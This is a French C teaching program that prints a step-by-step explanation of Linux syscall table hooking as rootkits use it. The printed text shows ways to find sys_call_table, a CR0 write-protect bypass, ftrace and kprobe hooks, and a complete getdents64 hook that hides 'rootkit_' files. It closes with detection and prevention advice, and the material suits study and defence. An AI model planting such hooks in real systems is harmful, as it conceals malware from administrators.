/*
 * OBJECTIF  : Comprendre le hooking de la table des syscalls
 * PREREQUIS : Bases C, syscalls, LKM, architecture kernel
 * COMPILE   : gcc -o example example.c
 *
 * Ce programme demontre les concepts du syscall table hooking :
 * structure de la syscall table, techniques de hooking (ftrace,
 * kprobe, patching direct), et comment les rootkits detournent
 * les appels systeme. Demonstration pedagogique en userspace.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

/*
 * Etape 1 : La table des syscalls
 */
static void explain_syscall_table(void) {
    printf("[*] Etape 1 : La table des appels systeme\n\n");

    printf("    ┌──────────────────────────────────────────────────┐\n");
    printf("    │         SYSCALL TABLE (sys_call_table)            │\n");
    printf("    │                                                  │\n");
    printf("    │  [  0] -> sys_read()                             │\n");
    printf("    │  [  1] -> sys_write()                            │\n");
    printf("    │  [  2] -> sys_open()                             │\n");
    printf("    │  [  3] -> sys_close()                            │\n");
    printf("    │  [  4] -> sys_stat()                             │\n");
    printf("    │  ...                                             │\n");
    printf("    │  [ 57] -> sys_fork()                             │\n");
    printf("    │  [ 59] -> sys_execve()                           │\n");
    printf("    │  [ 62] -> sys_kill()                             │\n");
    printf("    │  [ 78] -> sys_getdents()                         │\n");
    printf("    │  [217] -> sys_getdents64()                       │\n");
    printf("    │  ...                                             │\n");
    printf("    └──────────────────────────────────────────────────┘\n\n");

    printf("    Quand un programme fait syscall(NR, ...) :\n");
    printf("    1. Le CPU passe en Ring 0\n");
    printf("    2. Le handler regarde sys_call_table[NR]\n");
    printf("    3. Il appelle la fonction correspondante\n\n");

    printf("    Hooking = remplacer l'adresse dans la table :\n");
    printf("    sys_call_table[NR] = our_evil_function;\n");
    printf("    -> Chaque appel a ce syscall passe par NOTRE code\n\n");
}

/*
 * Etape 2 : Trouver l'adresse de la syscall table
 */
static void explain_finding_table(void) {
    printf("[*] Etape 2 : Trouver la syscall table\n\n");

    printf("    Methode 1 : kallsyms_lookup_name()\n");
    printf("    ──────────────────────────────────\n");
    printf("    // Depuis un LKM\n");
    printf("    unsigned long *sct;\n");
    printf("    sct = (void *)kallsyms_lookup_name(\"sys_call_table\");\n");
    printf("    // ATTENTION : desactivee sur les kernels recents !\n\n");

    printf("    Methode 2 : /proc/kallsyms (si non restreint)\n");
    printf("    ──────────────────────────────────\n");
    printf("    cat /proc/kallsyms | grep sys_call_table\n\n");

    /* Essayer de lire */
    FILE *fp = fopen("/proc/kallsyms", "r");
    if (fp) {
        char line[256];
        printf("    Recherche dans /proc/kallsyms :\n");
        int found = 0;
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, "sys_call_table")) {
                printf("      %s", line);
                found = 1;
            }
        }
        if (!found)
            printf("      (non trouve ou masque par kptr_restrict)\n");
        fclose(fp);
    }
    printf("\n");

    printf("    Methode 3 : kprobes (kernel recent)\n");
    printf("    ──────────────────────────────────\n");
    printf("    struct kprobe kp = { .symbol_name = \"sys_call_table\" };\n");
    printf("    register_kprobe(&kp);\n");
    printf("    sct = (void *)kp.addr;\n");
    printf("    unregister_kprobe(&kp);\n\n");

    printf("    Methode 4 : Scan memoire (brute force)\n");
    printf("    ──────────────────────────────────\n");
    printf("    Scanner la memoire kernel pour trouver des pointeurs\n");
    printf("    vers des fonctions syscall connues.\n\n");
}

/*
 * Etape 3 : Techniques de hooking
 */
static void explain_hooking_techniques(void) {
    printf("[*] Etape 3 : Techniques de hooking\n\n");

    printf("    Technique 1 : Patching direct de la table\n");
    printf("    ─────────────────────────────────────────────\n");
    printf("    // Desactiver la protection en ecriture\n");
    printf("    write_cr0(read_cr0() & ~0x10000);  // Clear WP bit\n");
    printf("    // OU\n");
    printf("    set_memory_rw((unsigned long)sct, 1);\n\n");
    printf("    // Sauvegarder l'original\n");
    printf("    orig_getdents64 = sct[__NR_getdents64];\n\n");
    printf("    // Remplacer par notre hook\n");
    printf("    sct[__NR_getdents64] = hooked_getdents64;\n\n");
    printf("    // Restaurer la protection\n");
    printf("    write_cr0(read_cr0() | 0x10000);\n\n");

    printf("    Technique 2 : ftrace hooking\n");
    printf("    ─────────────────────────────────────────────\n");
    printf("    struct ftrace_hook {\n");
    printf("        const char *name;       // nom de la fonction\n");
    printf("        void *function;         // notre hook\n");
    printf("        void *original;         // sauvegarde originale\n");
    printf("        struct ftrace_ops ops;  // operations ftrace\n");
    printf("    };\n");
    printf("    // Plus propre, ne modifie pas la table\n");
    printf("    // Utilise le framework ftrace du kernel\n\n");

    printf("    Technique 3 : kprobes\n");
    printf("    ─────────────────────────────────────────────\n");
    printf("    struct kprobe kp = {\n");
    printf("        .symbol_name = \"__x64_sys_getdents64\",\n");
    printf("        .pre_handler = handler_pre,\n");
    printf("        .post_handler = handler_post,\n");
    printf("    };\n");
    printf("    register_kprobe(&kp);\n\n");
}

/*
 * Etape 4 : Exemple de hook getdents64 (concept)
 */
static void show_hook_example(void) {
    printf("[*] Etape 4 : Exemple de hook getdents64 (code LKM)\n\n");

    printf("    // Hook pour cacher des fichiers commencant par 'rootkit_'\n");
    printf("    asmlinkage long hooked_getdents64(\n");
    printf("        unsigned int fd,\n");
    printf("        struct linux_dirent64 *dirent,\n");
    printf("        unsigned int count) {\n\n");
    printf("        // Appeler le syscall original\n");
    printf("        long ret = orig_getdents64(fd, dirent, count);\n");
    printf("        if (ret <= 0) return ret;\n\n");
    printf("        // Parcourir les entrees\n");
    printf("        struct linux_dirent64 *d = dirent;\n");
    printf("        long offset = 0;\n\n");
    printf("        while (offset < ret) {\n");
    printf("            d = (void *)dirent + offset;\n");
    printf("            // Si le nom commence par 'rootkit_', le supprimer\n");
    printf("            if (strncmp(d->d_name, \"rootkit_\", 8) == 0) {\n");
    printf("                int reclen = d->d_reclen;\n");
    printf("                memmove(d, (void *)d + reclen, ret - offset - reclen);\n");
    printf("                ret -= reclen;\n");
    printf("                continue;\n");
    printf("            }\n");
    printf("            offset += d->d_reclen;\n");
    printf("        }\n");
    printf("        return ret;\n");
    printf("    }\n\n");
}

/*
 * Etape 5 : Syscalls interessants pour les rootkits
 */
static void explain_target_syscalls(void) {
    printf("[*] Etape 5 : Syscalls cibles pour les rootkits\n\n");

    printf("    Syscall         | NR  | Usage du hook\n");
    printf("    ────────────────|─────|──────────────────────────────\n");
    printf("    getdents64      | 217 | Cacher fichiers et processus\n");
    printf("    read            |   0 | Modifier les donnees lues\n");
    printf("    write           |   1 | Logger les donnees ecrites\n");
    printf("    open/openat     | 2/257| Rediriger les ouvertures\n");
    printf("    execve          |  59 | Logger/controler executions\n");
    printf("    kill            |  62 | Signal magique pour backdoor\n");
    printf("    connect         |  42 | Cacher les connexions reseau\n");
    printf("    recvmsg         |  47 | Intercepter les donnees reseau\n");
    printf("    stat/lstat      | 4/6 | Cacher les metadonnees fichier\n\n");
}

/*
 * Etape 6 : Detection et prevention
 */
static void explain_detection(void) {
    printf("[*] Etape 6 : Detection et prevention\n\n");

    printf("    Detection de hooks :\n");
    printf("    1. Comparer les adresses de la syscall table\n");
    printf("       avec les adresses connues du kernel\n");
    printf("    2. Verifier l'integrite de /proc/kallsyms\n");
    printf("    3. Outils : rkhunter, chkrootkit, LKRG\n\n");

    printf("    Prevention :\n");
    printf("    - Secure Boot + module signing\n");
    printf("    - kernel.modules_disabled = 1\n");
    printf("    - Lockdown mode (integrity ou confidentiality)\n");
    printf("    - SELinux/AppArmor en mode enforce\n");
    printf("    - LKRG (Linux Kernel Runtime Guard)\n");
    printf("    - eBPF monitoring (tetragon, falco)\n\n");
}

int main(void) {
    printf("[*] Demo : Syscall Table Hooking\n\n");

    explain_syscall_table();
    explain_finding_table();
    explain_hooking_techniques();
    show_hook_example();
    explain_target_syscalls();
    explain_detection();

    printf("[+] Demo terminee avec succes\n");
    return 0;
}
